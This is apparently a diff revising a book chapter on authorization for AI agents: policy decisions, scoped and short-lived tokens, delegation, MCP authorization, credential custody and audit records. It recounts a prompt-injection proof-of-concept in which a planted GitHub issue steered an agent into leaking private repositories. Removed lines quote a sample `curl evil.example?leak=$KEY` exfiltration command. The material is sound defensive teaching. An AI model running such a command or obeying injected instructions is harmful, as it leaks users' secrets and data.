@@ -1,467 +1,201 @@
 # Security and Authorization {#sec-security-authorization}
 
-An agent acts in the world with someone's authority, and the central
-security question is how much of that authority travels with each call and
-for how long. A standing broad token plus a @gls-prompt-injection, an
-instruction hidden in untrusted content, equals a breach because the injected
-instruction inherits the whole grant. Identity
-and governance split the work of bounding that authority, while budget and
-audit sit downstream of a verified principal rather than forming systems of
-their own.
+An agent can propose an action; a trusted enforcement path decides whether that action may become an effect. This separation matters because authentication establishes claims about the caller, while authorization decides whether a specific subject may perform a specific action on a specific resource under the current context. A credential carries claims or grants; it is not the policy itself. Approval is an authorization input, and audit is evidence after the decision.
 
-![Schematic of privilege retained through delegation. Ambient authority stays dangerously flat, while capability-scoped delegation decays with each handoff. Idealized curves, not measured data.](/figures/security-authorization-1.svg){#fig-security-authorization-1}
+The distinction is especially important for agents. A @gls-prompt-injection, an instruction hidden in untrusted content, can make an agent request an action that the user never intended. It cannot create authority that the enforcement point does not grant. Least privilege therefore limits possible damage, but it does not make the request legitimate: if reading a private repository and writing to a public one are both allowed, an injected instruction can still combine those permissions. Task integrity and authorization are complementary controls, not substitutes.
 
-## The breach that names the problem
+## A proof of concept, not a universal law
 
-In May 2025, Invariant Labs disclosed a clean way to turn a reasonable
-configuration into a cross-repository data leak [@invariantlabs2025github].
-The GitHub integration for the Model Context Protocol (MCP), the
-tool-connection layer that exposes external systems to an agent, followed a
-common pattern: one personal access
-token, broad enough to span a user's repositories, reused for the life of a
-session. An attacker planted instructions in a public issue. When the agent
-read that issue, it followed the planted instructions, and because the single
-token already covered the user's private repositories, the agent used it to
-exfiltrate their contents. The failure was not a leaked secret. It was a
-correctly held secret that was too broad and too durable.
+In May 2025, Invariant Labs published a proof-of-concept against an agent using Claude Desktop, the official GitHub MCP server, and a personal access token [@invariantlabs2025github]. The researchers placed instructions in a malicious public issue. When the agent processed the issue, those instructions induced private-repository reads and then a write to a public pull request.
 
-That sentence names the problem, so it is worth taking apart.
-An agent's purpose is to take actions: read a repository, send an email,
-query a warehouse, call a model. Each action needs authority, and the
-tempting default is to authorize the agent once with a broad credential and
-let it reuse that credential for the session's life. The trouble is that a
-standing grant is reachable by anything that can reach the agent, and an
-agent's input channel is open by construction: it reads untrusted content. An
-attacker who plants instructions in a web page, a file, or a tool's output
-(indirect prompt injection, of which tool poisoning, a malicious tool
-description that hijacks the agent, is one variant) can steer
-the agent into using that grant. The token does not know whether the agent
-decided to act or was steered into it.
+The attack preconditions are the important part. The user had connected repositories through one credential; the agent could read attacker-controlled issue content; its available tools could read private data and publish data; and the relevant tool calls were approved, either individually or through the client's persistent “always allow” choice. The demonstration did not establish a session-long token lifetime, a real victim, or a flaw in every MCP implementation. It showed that a permitted data path can cross a trust boundary when untrusted content influences a planner.
 
-So the attack surface is the scope list. Authority that is broad and
-long-lived turns a single injected instruction into the union of everything
-the credential permits (@fig-security-ambient-fanout). The blast radius
-extends well past the one repository the attacker reached, out to every
-repository the same token covered.
-
-```{dot}
-//| label: fig-security-ambient-fanout
-//| fig-cap: "Ambient authority: one injected instruction inherits the entire scope of one long-lived token, so the blast radius is the union of every resource the credential covers. After the Invariant Labs GitHub MCP disclosure (2025)."
-digraph fanout {
-  bgcolor="transparent";
-  rankdir=LR;
-  node [shape=box, fontname="Helvetica", fontsize=11, style="rounded", color="#6b7280", fontcolor="#6b7280", penwidth=1.1];
-  edge [fontname="Helvetica", fontsize=10, color="#6b7280", fontcolor="#6b7280"];
-
-  inj  [label="Injected instruction\nin untrusted content", color="#3b82f6", fontcolor="#3b82f6"];
-  ag   [label="Agent\nreads open input channel"];
-  tok  [label="One standing token\nbroad scope, long TTL"];
-
-  r1 [label="repo 1"];
-  r2 [label="repo 2"];
-  rn [label="repo N"];
-
-  inj -> ag [label="  steers"];
-  ag  -> tok [label="  reuses"];
-  tok -> r1;
-  tok -> r2;
-  tok -> rn [label="  exfiltrate"];
-}
-```
-
-The GitHub case is one shape of a more general failure, and three further
-problems compound it. The agent runs on shared infrastructure, so the
-platform must know which tenant an action belongs to, or a retrieval query
-silently returns one tenant's data into another's session. Provider keys and
-OAuth tokens that pay for and authorize the work must not be reachable by the
-generated code that might leak them. And when a human withdraws consent, the
-authority already issued must actually stop, not merely be flagged. Each of
-these is the same question asked of a different resource: how much authority
-travels, and for how long.
+That result is not a universal property of MCP. MCP supplies a tool transport and, for some transports, an authorization profile. It does not determine a deployment's repository policy or prove that a requested tool action serves the user's intent. Defense in depth must address both: restrict reachable authority at the enforcement boundary, and constrain how untrusted data may influence control flow, as discussed for retrieval in @sec-rag-retrieval and for the harness in @sec-the-harness.
 
 <figure id="fig-security-authorization-blast-radius">
 <div class="viz" data-viz="blast-radius"></div>
-<figcaption>One token and the resources its scope reaches. A standing, broadly-scoped token puts the whole reachable set one injected instruction away, and a longer TTL widens the exposure window. Switch to a short-lived capability token, minted per call, and the blast radius collapses to the one resource the call actually needs. Illustrative.</figcaption>
+<figcaption>A toy configured scenario over 18 resources. Scope count and TTL are user-set assumptions, not measurements. The “narrow” token reaches one resource only in this example; real reach also depends on action, resource, network, approval, and runtime policy.</figcaption>
 </figure>
 
-## Two fabrics, one verb
+## Define the decision before choosing the token
 
-The answer is to make authority a first-class, narrow, short-lived,
-attributed thing. In a mature platform that thing is owned by two cooperating
-fabrics that split a single verb: governance *declares* what an agent may
-attempt, and identity *enforces* it on the wire. Before reaching that seam,
-both fabrics consume the same primitive.
+Let an authorization query be
 
-### The principal tuple
+$$
+\begin{aligned}
+q &= (s,a,r,c), \\
+d &= P_v(q), \\
+d &\in \{\mathrm{allow},\mathrm{deny},\mathrm{challenge}\}.
+\end{aligned}
+$$
 
-Every operation resolves its caller into
-`(user_id, tenant_id, agent_id, workload_id, scopes, attributes)` and answers
-one question: may this principal take this action on this resource? That tuple
-is what every other system consumes. Persistence stamps it on a session, the
-cost pipeline bills against it, the audit log attributes to it. An audit entry
-that records "session X did Y" without the verified tuple cannot answer the
-only questions an investigation asks, which are who and for which tenant.
+Read the tuple as subject s, action a, resource r, context c, evaluated under policy revision v. The subject is the authenticated actor and delegation information; the action is the exact operation; the resource is the exact target; and the context contains trusted facts such as tenant, task, time, data classification, and budget state. The local platform outcome $d$ is allow, deny, or challenge. “Challenge” means that a new factor, such as exact human approval, is required before reevaluation. AuthZEN's standardized response is Boolean; a platform can represent challenge as deny plus typed step-up context or as a local extension [@authzen2026]. Unknown or missing inputs deny by default on consequential paths.
 
-### Three identities, not a hierarchy
+The subject is not a single opaque ID. Useful subject claims preserve:
 
-The harness reconciles three principals on every call, and they are
-orthogonal axes that cannot be collapsed (@fig-security-three-identities).
+- the user identity, if a live or earlier user grant exists;
+- the agent or session revision that proposed the action;
+- the workload identity of the executing process;
+- the tenant binding and delegation chain; and
+- the provenance of every authenticated claim.
+
+These roles are not universally separate principals. A scheduled service may have no live user, one task may move across several workloads, and an agent revision may be an attribute rather than an identity in a particular system. A workload identity, including a SPIFFE SVID, authenticates software; it does not prove user intent or permission [@spiffe2026identity]. A tenant value used by policy must come from an authenticated claim or authoritative resource lookup, not from an untrusted request header.
+
+### Effective authority is an intersection
+
+Define every grant over the same universe of action-resource-context tuples. In words, the effective authority is what all five grants permit at once:
+
+$$
+\begin{aligned}
+\mathcal{E}={}&\mathcal{G}_{\mathrm{user}}
+\cap\mathcal{G}_{\mathrm{agent}}
+\cap\mathcal{G}_{\mathrm{workload}} \\
+&\cap\mathcal{G}_{\mathrm{resource}}
+\cap\mathcal{G}_{\mathrm{runtime}}.
+\end{aligned}
+$$
+
+The user grant expresses delegated consent. The agent grant bounds the named agent or session. The workload grant says which running software may call. The resource policy applies ownership, sharing, and tenant rules. Runtime constraints include network destinations, approval state, rate and budget limits, and current risk signals. An intersection can only remove authority. In practice, the policy decision point computes the decision, while a policy enforcement point blocks or performs the effect [@rose2020zerotrust]. Authentication and token issuance supply trusted inputs; neither performs enforcement by itself.
+
+This model also explains why a scope list is not the entire attack surface. Tool descriptions, parameter parsing, output dataflow, enabled operations, network reachability, redirects, and credential custody all affect what an attacker can reach.
+
+## From request to effect
+
+Complete mediation means the platform must authorize every external effect, not merely the session or the first tool call. A reliable path is:
 
 ```{dot}
-//| label: fig-security-three-identities
-//| fig-cap: "Three orthogonal principals reconciled on every call. The user is delegated onto the agent, the agent runs as a workload, and the workload reaches external systems. Each axis answers an attribution the other two cannot."
+//| label: fig-security-request-effect
+//| fig-cap: "A request becomes an effect only after trusted normalization, policy evaluation, any exact approval, and enforcement. The outcome receipt is linked to the authorized request."
 digraph {
   bgcolor="transparent";
   rankdir=TB;
-  nodesep=0.4; ranksep=0.5;
-  node [shape=box, style="rounded,filled", fontname="Helvetica", fontsize=10, color="#6b7280", fontcolor="#6b7280", fillcolor="#f1ece1", penwidth=1.1];
-  edge [fontsize=10, fontname="Helvetica", color="#6b7280", fontcolor="#6b7280"];
-
-  U [label="User identity\nhuman, SSO, MFA"];
-  A [label="Agent identity\nname, version, capabilities"];
-  W [label="Workload identity\npod, process, SPIFFE ID"];
-  EXT [label="External systems"];
-
-  U -> A [label="on-behalf-of"];
-  A -> W [label="runs as"];
-  W -> EXT [label="calls"];
+  graph [nodesep=0.18, ranksep=0.25];
+  node [shape=box, style="rounded", fontname="Helvetica", fontsize=9, color="#6b7280", fontcolor="#6b7280", margin="0.08,0.05", width=2.0];
+  edge [fontname="Helvetica", fontsize=8, color="#6b7280"];
+  a [label="Authenticate claims"];
+  n [label="Canonicalize request"];
+  d [label="PDP decision"];
+  h [label="Exact approval\nif required"];
+  c [label="Narrow credential"];
+  e [label="PEP executes once"];
+  r [label="Effect receipt"];
+  a -> n -> d -> h -> c -> e -> r;
 }
 ```
 
-The user is the human authenticated through SSO, with consent that can be
-withdrawn. The agent, by contrast, is a named and versioned principal carrying
-its own capability surface, and that surface is what makes "the agent did X,
-not the user" expressible at all. Last comes the workload, the runtime itself,
-which settles a question the other two cannot: is this a legitimate harness
-replica, or something else in the cluster that obtained a token? Each identity
-closes an attack the others leave open, and each carries an attribution the
-others cannot.
-
-### Declares versus enforces
-
-Two fabrics split the work of bounding authority, and the seam between them is
-the load-bearing idea. Governance *declares* an attenuation:
-this agent may only read, only this repository, only under a spending ceiling.
-Identity *enforces* it, by minting a token scoped to exactly that and refusing
-to mint anything broader. Capability attenuation is governance's vocabulary;
-token scoping is identity's mechanism for making it true on the wire. The
-cleanest test for which fabric owns a concern: if revoking it changes who can
-reach a resource, it is identity; if revoking it changes what an authorized
-principal is permitted to attempt, it is governance. A token's `scope` claim
-sits on the seam precisely because identity writes it to encode what
-governance decided (@fig-security-declares-enforces).
-
-```{dot}
-//| label: fig-security-declares-enforces
-//| fig-cap: "Governance declares an attenuation, identity enforces it by minting a token scoped to exactly that. The scope claim sits on the seam. The revocation test names which fabric owns a concern: who-can-reach is identity, what-may-attempt is governance."
-digraph {
-  bgcolor="transparent";
-  rankdir=LR;
-  nodesep=0.4; ranksep=0.5;
-  node [shape=box, style="rounded,filled", fontname="Helvetica", fontsize=10, color="#6b7280", fontcolor="#6b7280", fillcolor="#f1ece1", penwidth=1.1];
-  edge [fontsize=10, fontname="Helvetica", color="#6b7280", fontcolor="#6b7280"];
-
-  subgraph cluster_GOV {
-    label="Governance: declares";
-    style=rounded; color="#6b7280"; fontcolor="#6b7280"; fontsize=10;
-    doc [label="Agent document\nprompt, tool grants,\nbudget, approvals"];
-    att [label="Attenuation\nread only, this repo,\nunder a ceiling"];
-    doc -> att;
-  }
-  subgraph cluster_ID {
-    label="Identity: enforces";
-    style=rounded; color="#6b7280"; fontcolor="#6b7280"; fontsize=10;
-    mint [label="Token broker\nmints scoped token,\nrefuses anything broader"];
-  }
-  ext [label="External system"];
-  rev [label="Revoke it: what changes?", shape=diamond];
-
-  att -> mint [label="scope claim\non the seam", penwidth=2];
-  mint -> ext [label="on the wire"];
-  rev -> mint [label="who can reach a resource"];
-  rev -> doc [label="what a principal may attempt"];
-}
-```
-
-Governance treats the agent as a *document*, not a running process: a named,
-owner-signed, versioned record of its prompt, its tool grants, its model
-binding, its budget, and its approval steps. The document is the thing that
-answers "what was this agent allowed to do at the moment it acted," because
-the allowance is the document at a point in version control. The load-bearing
-invariant on delegation is $C_{child} \subseteq C_{parent}$: authority can
-only ever shrink as work is handed down a chain, never grow.
-
-### Credential custody
-
-The provider key and the OAuth token live in the fabric, never in the agent's
-environment, config, logs, or command history. The agent receives a scoped,
-short-lived handle that the fabric exchanges for the real credential at call
-time. This is the same secret-reachability discipline that the harness
-applies at the sandbox boundary (@sec-the-harness): generated code must not
-read high-value secrets. It matters most for provider keys because their
-blast radius is unattributed spend on someone else's models, discovered on
-the invoice.
-
-That exchange assumes something can mint the short-lived credential. It holds
-for a provider key behind a model gateway, and for anything that speaks OAuth
-token exchange or on-behalf-of. It does not hold for a static third-party
-secret a vendor will not rotate per call: a payment key, a database password, a
-partner API token. The tempting fix is to hand that secret to the sandbox
-directly, as an environment variable or a mounted file. That is universal and
-needs no code change, but it moves the real secret inside the box, where the
-lethal trifecta of @sec-runtime-safety turns one injected
-`curl evil.example?leak=$KEY` into an exfiltration. The custody discipline
-survives for a static secret through *egress substitution*: the box holds an
-opaque placeholder in the secret's place, and a TLS-terminating egress proxy
-holds the real value and swaps it onto the wire, but only toward the hosts the
-credential is scoped to. A placeholder sent anywhere else is inert, so leaking
-it buys the attacker nothing. The cost is explicit and worth naming: the proxy
-terminates TLS for the scoped hosts, so it reads the plaintext of those
-requests and the client must trust its certificate authority; and it cannot
-help authentication that never puts the secret verbatim on the wire, request
-signing (AWS SigV4) or challenge-response (SCRAM), because there is nothing to
-substitute.
+Canonicalization must happen before policy evaluation. Normalize the canonical action, canonical resource, destination, method, parameters, Unicode, defaults, units, and redirect policy, then hash every execution-relevant field. At time-of-use, the enforcement point recomputes that hash and requires an exact match with the decision. This closes the common time-of-check/time-of-use gap in which approval covers one target but execution uses another.
 
 ```{=html}
-<figure id="fig-security-credential-custody">
+<figure id="fig-security-authorization-stepper">
 <div class="viz" data-viz="stepper">
-<div data-chip="Sidecar" data-title="1 · A credential proxy beside the box">The secret lives in an external trust plane. The workload dials a local proxy that forwards each call and attaches the real credential. The secret never enters the box, but the proxy has to understand every provider it fronts, and the code must be written to call it. The plumbing grows with the provider list.</div>
-<div data-chip="Inject" data-title="2 · Hand the secret to the box">Drop the proxy and put the real secret in the sandbox as an environment variable or a mounted file. Any SDK reads it with no code change. The secret now sits inside the box, so one injected <code>curl evil.example?leak=$KEY</code> exfiltrates it: the lethal trifecta is open.</div>
-<div data-chip="Substitute" data-title="3 · A placeholder in the box, the secret at egress">Give the box an opaque placeholder and keep the real secret in a TLS-terminating egress proxy. The proxy swaps the placeholder for the secret only toward the credential's scoped hosts. The same env-var simplicity as step 2, but the exfiltration now leaks an inert placeholder.</div>
+<div data-chip="Claims" data-title="1 · Authenticate authoritative claims">Bind user, actor, workload, tenant, and delegation claims to evidence. The agent may propose values but cannot assert them.</div>
+<div data-chip="Request" data-title="2 · Build one canonical action">Resolve the exact action, resource, destination, normalized parameters, data classification, and conservative cost bound.</div>
+<div data-chip="Decide" data-title="3 · Evaluate a versioned policy">The policy decision point returns allow or deny, a short decision expiry, reasons, and typed obligations. An approval requirement is a local challenge outcome.</div>
+<div data-chip="Approve" data-title="4 · Bind any human approval">A trusted UI presents the real effect and binds a one-time challenge to its request hash, provenance, nonce, and expiry.</div>
+<div data-chip="Execute" data-title="5 · Enforce and record">The policy enforcement point verifies the unchanged request, reserves budget, attaches narrow credentials, executes once, and records the result.</div>
 </div>
-<figcaption>Three deliveries of a static third-party secret. Each step keeps the previous one's gain and pays down its cost: the sidecar keeps the secret out but is provider-aware, injection is universal but exposes the secret, substitution is universal and keeps the secret out of the box.</figcaption>
+<figcaption>The authorization pipeline. Each stage consumes a more precise record; no natural-language agent summary is treated as the action itself.</figcaption>
 </figure>
 ```
 
-```{dot}
-//| label: fig-security-egress-substitution
-//| fig-cap: "Egress substitution. The sandbox holds only an opaque placeholder. A TLS-terminating egress proxy swaps in the real secret toward the credential's scoped host, and passes the placeholder through unchanged everywhere else, so an exfiltration attempt carries nothing usable."
-digraph {
-  bgcolor="transparent";
-  rankdir=LR;
-  nodesep=0.4; ranksep=0.6;
-  node [shape=box, style="rounded,filled", fontname="Helvetica", fontsize=10, color="#6b7280", fontcolor="#6b7280", fillcolor="#f1ece1", penwidth=1.1];
-  edge [fontsize=10, fontname="Helvetica", color="#6b7280", fontcolor="#6b7280"];
+High-impact paths fail closed when identity, policy, approval, budget reservation, or audit intent is unavailable. A low-risk degraded path is defensible only when its operations and limits were enumerated before the outage. A generic bypass route quietly turns an availability feature into ambient authority.
 
-  vault [label="Secret store\n(real secret)", shape=cylinder];
-  sb [label="Sandbox\nenv var = placeholder"];
-  prox [label="TLS-terminating\negress proxy"];
-  api [label="Scoped host\napi.provider.com", shape=cylinder];
-  evil [label="Attacker host\nevil.example", shape=cylinder];
+### Bind approval to the exact effect
 
-  vault -> prox [label="real secret\n(never enters box)"];
-  sb -> prox [label="request carries\nplaceholder"];
-  prox -> api [label="placeholder to secret,\nsubstituted"];
-  prox -> evil [style=dashed, label="placeholder passes\nthrough, inert"];
-}
+Human approval should be risk-tiered, not requested for every harmless read. When required, a trusted surface shows the exact action, resource, and canonical parameters, including the destination and sensitive data movement. The approval carries a one-time challenge, request hash, nonce, provenance, and expiry. It expires; approval cannot be reused for changed arguments, a new redirect, or a later operation.
+
+Human approval does not repair a misleading preview. If the agent writes the summary, hides a destination, or repeatedly asks until the user clicks, the ceremony provides little assurance. The independent enforcement path must render authoritative fields and reevaluate the final request, connecting authorization to the oversight limits in @sec-oversight-control.
+
+## Delegation without authority growth
+
+Delegated authority should not grow. A child grant should be a subset of the parent grant for only the inherited delegation. Formally, $\mathcal{G}_{child}\subseteq\mathcal{G}_{parent}$ is a necessary local invariant over the same action-resource-context universe. It is not sufficient: the child must also preserve audience, tenant, purpose, expiry, approval, and dataflow constraints, and several child grants must not reconstruct a broader union.
+
+The service's independent authority is different and must not be forwarded as if the user delegated it. The audit chain should retain actor and subject so downstream services can distinguish delegation from impersonation. RFC 8693 supplies a token-exchange protocol and fields for subject and actor tokens, resources, audiences, and scopes; token exchange does not by itself preserve the user's policy, attenuate the result, revoke the input token, or propagate later revocation [@jones2020rfc8693]. Those are authorization-server and resource-server responsibilities.
+
+### Token properties are not interchangeable
+
+| Control | Guarantee | What it does not guarantee |
+|---|---|---|
+| Narrow scope | Limits represented operations if the resource server enforces it | The exact target, user intent, or safe parameters |
+| Resource indicator | Requests an audience-restricted token for a target service | Repository-level or tool-level permission |
+| Sender-constrained token | Requires proof of possession by a bound client | That the client is acting for a legitimate task |
+| Short expiry | Short lifetime limits exposure after loss or offline revocation | Immediate revocation |
+| Introspection or reference token | Lets a resource server obtain current token state | Zero latency if responses are cached |
+| Revocation list or pushed status | Can invalidate self-contained tokens before expiry | Correct policy or complete deployment coverage |
+
+A bearer token can be replayed by whoever obtains it. A sender-constrained token adds proof of possession, while an audience-restricted token limits where it should be accepted; OAuth security guidance recommends both where appropriate [@lodderstedt2025rfc9700]. RFC 8707's resource indicator identifies the target service, not the exact repository, tool, or action [@campbell2020rfc8707].
+
+Short expiry is useful, but does not provide immediate revocation. OAuth token introspection can expose current state, and a reference token can require an online lookup; a revocation list can invalidate a self-contained token. Caching adds a measurable stale window. RFC 7009 and RFC 7662 describe revocation and introspection, but related-token propagation remains deployment policy [@lodderstedt2013rfc7009; @richer2015rfc7662]. Test worst-instance revocation latency rather than assuming TTL is the answer.
+
+Attenuable credentials can make restriction composable. Macaroons, for example, let holders add contextual caveats that verifiers check [@birgisson2014macaroons]. They do not automatically produce a per-call token, choose the right caveats, or protect against malicious use that remains inside those caveats.
+
+## MCP authorization has a narrower job
+
+Authorization is optional for MCP implementations. In the stable MCP authorization profile, an HTTP-based protected server acts as an OAuth resource server and publishes OAuth protected resource metadata; the client discovers authorization metadata and sends the RFC 8707 resource value for the canonical server URI [@mcp2026auth]. The server must validate that the token was intended for it. STDIO deployments use their environment's credential mechanism rather than this HTTP flow.
+
+Audience validation prevents one class of token passthrough. It does not stop prompt injection, does not decide whether a tool action is appropriate, and does not distinguish two repositories behind the same MCP server unless application policy does so. The MCP server remains a policy enforcement point for tool name, canonical arguments, resource ownership, and current context.
+
+## Keep credentials out, then constrain their use
+
+Reusable secrets should not appear in model context, generated code, logs, or a sandbox environment. A credential broker can give the executor an opaque handle and attach the real credential after authorization. For a static secret, a provider-aware egress proxy may inject it after TLS termination. Both patterns protect custody; neither proves that a permitted request is benign.
+
+The proxy therefore needs a destination allowlist plus canonical method, path, operation, parameter, redirect, and DNS policy. A host restriction is not API-level authorization: an injected request to an allowed host can still delete data or publish secrets. Provider signing and challenge-response protocols require provider-aware handling rather than string replacement. TLS termination also creates a trust boundary: the proxy sees plaintext and clients must trust its certificate authority. The enforcement record should name that boundary without logging the static secret.
+
+## Tenant isolation is another enforcement layer
+
+The tenant is part of the authenticated subject and resource, supplemented by an explicit ownership or sharing model for global and cross-tenant resources. A pooled database can enforce a row-level policy; namespaces or shards add namespace isolation; separate accounts or clusters add physical isolation. These are defense in depth. Physical isolation reduces the blast radius of some implementation errors, but does not replace authorization at control planes, shared gateways, backups, or routing layers.
+
+Choose isolation per resource and consequence, not as one platform-wide slogan. Retrieval memory can deserve a stronger boundary than low-sensitivity telemetry. Every tier needs cross-tenant negative tests: forged tenant headers, mismatched resource ownership, shared-resource rules, background jobs, caches, exports, restore paths, and administrative operations. Partitioning makes some mistakes harder; it does not make policy unnecessary.
+
+## Budgets are authorization obligations
+
+A warning after a provider charge is evidence, not enforcement. A hard budget gate authenticates the budget subject and atomically reserves a conservative upper bound before the call. For one budget period, require
+
+$$
+S+R+E\le L,
+$$
+
+where $S$ is settled usage, $R$ is outstanding reservations, $E$ is the proposed action's conservative upper-bound cost, and $L$ is the limit. All four quantities use the same subject, period, currency or unit. After execution, settle actual use and release the remainder. Parallel calls must contend on the same reservation state or each can independently pass the limit. This is the authorization consequence of the economic controls in @sec-economics.
+
+## The operating contract
+
+The request, decision, enforcement attempt, and effect need linked but distinct records. A decision record is not proof that the external effect occurred. Conversely, an external response without the decision revision cannot explain why the effect was permitted.
+
+A practical, versioned contract contains:
+
+```text
+authorization_request_id
+subject_claims_and_provenance
+agent_model_tool_revisions
+delegation_chain
+action_resource_and_canonical_parameters
+tenant_and_data_classification
+policy_bundle_revision
+decision_obligations_and_reason
+approval_challenge_and_binding
+credential_audience_scope_sender_and_expiry
+enforcement_point_and_result
+budget_reservation_and_reconciliation
+effect_idempotency_key
+revocation_and_failure_mode
+audit_evidence_and_retention
 ```
 
-### Tenancy as the coarsest ownership axis
+Before a side effect, append a write-ahead intent outside the agent's write authority. It binds the request hash, decision, executor, reservation, credential handle, and idempotency key. After the attempt, append an effect receipt with status `succeeded`, `failed`, or `unknown`, provider transaction IDs, result hash, actual usage, and error class. `unknown` is essential when a timeout leaves external completion ambiguous. A receipt proves what this enforcement path recorded; it does not prove the model's natural-language rationale, deletion elsewhere, or absence of unlogged effects.
 
-Every resource carries a tenant attribute or is silently trapped in one
-tenant. Isolation then lives on a spectrum whose defining property is blast
-radius on a bug, and the choice is made per resource class rather than
-platform-wide, because blast radius is not uniform: a leaked audit row is a
-confidentiality incident, but a leaked cross-tenant memory retrieval is an
-active data breach that surfaces one tenant's content inside another's live
-session (@sec-memory-systems, @sec-rag-retrieval).
-
-## From broad to ephemeral
-
-The packaging of authority for a call has moved steadily from broad and
-durable toward narrow and ephemeral, driven by each incident that the prior
-shape made possible. The GitHub breach sits at the start of that arc, not the
-end: it is what the oldest packaging looks like when an agent reads untrusted
-input.
-
-**Broad bearer tokens** were the default because they are one consent dialog
-and one credential. Their cost is temporal: a broad token is a standing grant
-reachable by anything that can reach the agent. GitHub's fine-grained personal
-access tokens and Google's narrowed consent screens exist to claw back from
-this pattern. So does the protocol that carried the breach: the June 2025
-revision of the MCP specification makes every MCP server an OAuth 2.1 resource
-server and requires clients to bind each token to one server's canonical URI
-via RFC 8707 resource indicators, so a token minted for one server is refused
-by every other [@mcp2025auth].
-
-**Short-lived capability tokens** invert the standing grant: each tool call
-mints a token carrying exactly the permissions that call needs, with a TTL in
-minutes, so the window in which a leaked or injected call can do damage
-shrinks from a session to a single operation. Macaroons (2014) and Biscuit
-are the formal grounding: tokens a holder can *attenuate*, adding caveats that
-only further restrict, never widen, so a service hands a strictly weaker token
-to the next hop without calling back to the issuer
-[@birgisson2014macaroons]. This is the object-capability discipline, and it
-is exactly $C_{child} \subseteq C_{parent}$ expressed at the token layer.
-
-**@gls-obo** propagates the user's authority end to end instead of
-replacing it with the agent's, so a warehouse's row-level security sees the
-human, not the service account. RFC 8693 formalizes the token exchange
-[@jones2020rfc8693]; the agent-specific proposal, the IETF draft on
-on-behalf-of-user authorization for AI agents, encodes user plus agent plus
-client identity in one delegated token, though it remains an individual draft
-rather than an adopted standard [@oauth2025agents]. Okta for AI Agents
-[@okta2025agents] and Auth0's agent-identity work [@auth02026identity] ship
-this as product rather than draft.
-
-**Workload identity** (SPIFFE/SPIRE) lets the pod prove what it is
-cryptographically, with no shared secret to leak. It is what lets the token
-broker refuse to mint a user token for a process that merely sits in the
-cluster, and it is standard for anything multi-replica.
-
-The selection rule that this history settles into: broad scopes are
-defensible only for single-user, low-privilege deployments; capability tokens
-earn their plumbing when actions are high-privilege or irreversible; OBO is
-load-bearing whenever downstream authorization is user-dependent; SPIFFE is
-standard for anything multi-replica.
+Verification should exercise denials, not only happy paths: cross-tenant access, forged attributes, modified post-approval arguments, replayed challenges, unapproved redirects, unavailable policy or audit, concurrent budget races, revocation latency, duplicated idempotency keys, and a compromised agent attempting to read a credential. Multi-agent delegation needs the same tests at every handoff (@sec-multi-agent-systems).
 
 ::: {.callout-important}
 ## What's contested
-Whether governance is a primitive distinct from identity is genuinely
-unsettled. The skeptical position is that identity already issues attenuable,
-scoped, delegatable tokens (Macaroons, Biscuit, OBO, the `agent_id` in its
-tuple), so there is nothing left for a separate fabric to own. The separation
-argument answers with a question identity cannot answer alone: what was this
-agent allowed to do at the moment it acted? The answer is not a token scope;
-it is a prompt, a tool list, a budget, and a set of approval steps, the
-agent's versioned document, which identity never held. The
-counterweight is that the market is thin: there is no mature, vendor-neutral
-"governance fabric" category the way there is for identity (Okta, Auth0,
-SPIFFE) or sandboxes. A thin market is what an under-served primitive looks
-like before it is named, but it is also what a non-primitive looks like, and
-that is why the question stays open.
+
+Three boundaries remain unsettled. First, a central policy decision point gives consistent revisioning and evidence, while local decisions reduce latency and correlated outages; many systems combine central policy distribution with local enforcement. Second, an agent or session revision can be a first-class principal or merely a claim attached to user and workload identities. The useful test is whether independent lifecycle, policy, and attribution justify the added principal. Third, exact approval is strong for rare, legible effects but degrades under repetition or opaque previews. None of these choices removes the need for complete mediation and testable failure behavior.
 :::
-
-## Where it bites
-
-Every choice here prices one good against another, and the knees
-are sharp. Five trade-offs recur, and each one is a place where a defensible
-decision has a sharp downside that the alternative does not.
-
-- **Isolation granularity versus sharing flexibility.** Flat-user tenancy is
-  trivially isolated and cannot share. A three-level org-project hierarchy is
-  legible by inspection but calcifies the moment the real org is a matrix
-  rather than a tree. Attribute-based access fits any topology but makes "who
-  can see what?" undecidable by reading the data, which breaks offline audit
-  and erasure traversals. Pick the simplest shape that fits the org and leaves
-  the ownership graph walkable.
-- **Revocation latency versus long TTL.** Revocation latency is unavoidable
-  with bearer tokens: a user withdrawing consent does not reach into
-  already-issued tokens, so the session runs on revoked authority until the
-  token expires. The TTL is therefore the ceiling on how long a revoked grant
-  stays exploitable. Long-TTL tokens and a right to immediate revocation are
-  mutually exclusive, and the more sensitive the tenant, the shorter the token
-  must live.
-- **Partition-at-write versus filter-at-read.** A `tenant_id` filter applied
-  at read time is one missing `WHERE` clause from a leak; an index that is
-  physically per-tenant cannot leak even if the query is wrong. Filtering is
-  cheap; partitioning is safe.
-- **Consent fatigue.** Re-prompting on every action trains users to grant the
-  broadest scope available just to silence the dialog, which manufactures the
-  ambient authority the whole design fights. The structural fix is to make the
-  agent a first-class identity with its own durable, auditable grant rather
-  than a proxy that re-borrows the user's authority per action.
-- **Centralization versus availability.** A single fabric in front of all
-  model inference makes attribution and synchronous budget enforcement
-  possible, but it is by construction a single point of failure: when it is
-  down, every active session stalls at once. The centralization that buys
-  control must be paid for with a fallback route and a circuit breaker.
-
-Change the TTL below and watch the window in which a revoked token stays
-exploitable: with consent withdrawn at a random moment in the token's life,
-the mean exposure is half the TTL and the worst case is the full TTL.
-
-:::: {.runnable}
-```python
-import numpy as np
-
-rng = np.random.default_rng(0)
-trials = 100_000
-for ttl_min in [60, 15, 5, 1]:
-    # consent withdrawn at a uniformly random moment within the token's life
-    withdraw = rng.uniform(0, ttl_min, trials)
-    # exposure = time the session keeps running on revoked authority
-    exposure = ttl_min - withdraw
-    print(f"TTL={ttl_min:>3} min  ->  mean exposure {exposure.mean():5.2f} min,"
-          f"  worst case {exposure.max():5.2f} min")
-print("\nExposure window scales linearly with TTL: the TTL is the ceiling.")
-```
-::::
 
 ::: {.callout-tip}
-## Constraint arrow
-Budget enforcement is dictated by identity, not by the cost system. A cap that
-says "this tenant may spend five thousand dollars a month" is meaningless
-unless every model call carries a *verified* tenant at the moment of the call,
-before the spend happens (@sec-economics). The runaway-spend incidents, the
-\$47,000 agent loop [@waxell2025loop] and the Claude Code recursion that
-burned 1.67 billion tokens in five hours [@claudecode2025tokens], are not
-purely cost-system failures. Budgets existed in both; they fired on spend the
-system could attribute only after the money was gone. Per-tenant enforcement
-is downstream of a verified principal because attribution has to precede the
-call, and a cost cap can only be as precise as the identity handed to it.
+## Lower-layer constraint
+
